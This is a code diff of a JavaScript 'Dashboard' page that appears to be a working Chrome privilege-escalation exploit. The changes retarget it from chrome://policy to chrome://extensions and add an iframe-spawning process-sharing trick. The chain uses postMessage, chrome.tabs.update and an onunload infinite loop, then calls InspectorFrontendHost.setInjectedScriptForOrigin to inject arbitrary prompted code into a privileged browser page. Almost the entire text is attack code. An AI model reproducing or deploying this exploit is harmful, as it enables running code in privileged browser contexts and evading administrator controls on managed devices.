@@ -106,6 +106,32 @@
             }
             document.close();
             document.title = "Dashboard";
+
+            const DataHTML = `<html><head></head><body><script>const url = URL.createObjectURL(new Blob(["<h1>hi</h1>", {type: "text/html"}]));
+            
+            var i = 0;
+                        const id = this.setInterval(function () {
+                            if (i++ === 100) {
+                                clearInterval(id);
+                                return;
+                            };
+                            const ifr = document.createElement('iframe');
+                            ifr.src = url;
+                            document.body.appendChild(ifr);
+                        },500);
+            </script></body></html>`;
+            const dataURL = `data:text/html;base64,${btoa(DataHTML)}`;
+            document.querySelector('#forceprocsharing').onclick = function (ev) {
+                const ifr = document.body.appendChild(document.createElement('iframe'));
+                window.addEventListener('message', function (ev) {
+                    if (typeof ev.data === "string") {
+                        // this.alert(ev.data);
+                        
+                    }
+                })
+                ifr.src = dataURL;
+
+            }
             document.querySelector('#activate2').onclick = function (ev) {
 
                 function xd(w) {
@@ -136,13 +162,13 @@
 
                                 }
                                 const htmlFile = `<html>
-                                <head></head><body><iframe src="blob:chrome://policy/f6e82603-005a-40f0-a200-231bcf14eca4"></iframe>
+                                <head></head><body><iframe src="chrome://extensions/"></iframe>
                                 </html>
                                 
                                 `
-                                
+
                                 // alert(url);
-                                opener.postMessage({ url: URL.createObjectURL(new Blob([htmlFile], {type: "text/html"})) }, '*');
+                                opener.postMessage({ url: URL.createObjectURL(new Blob([htmlFile], { type: "text/html" })) }, '*');
                                 setTimeout(function () {
                                     close();
                                 }, 800);
@@ -153,8 +179,8 @@
                                 onmessage = function (data) {
                                     if (data.data.type === "ack") {
                                         // chrome.tabs.getCurrent(function (tab) {
-                                            // alert("navigating");
-                                            chrome.tabs.update(tab.id, { url })
+                                        // alert("navigating");
+                                        chrome.tabs.update(tab.id, { url })
                                         // })
                                     }
                                 }
@@ -197,7 +223,7 @@
                 if (d.data.type === "acc") {
                     onunload = function () { while (true); };
                     d.source.postMessage({ type: "ack" }, '*');
-                    
+
                 };
 
                 if (!globalMap[d.data.uid]) return;
@@ -228,8 +254,8 @@
                     const b = prompt("code to execute!");
                     if (!b) return;
                     injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));
-                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');
-                    
+                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://extensions', b + '//');
+
                 }
                 const URL_1 = `chrome-extension://${x ??
                     alert("NOTREACHED")}/${path}`;
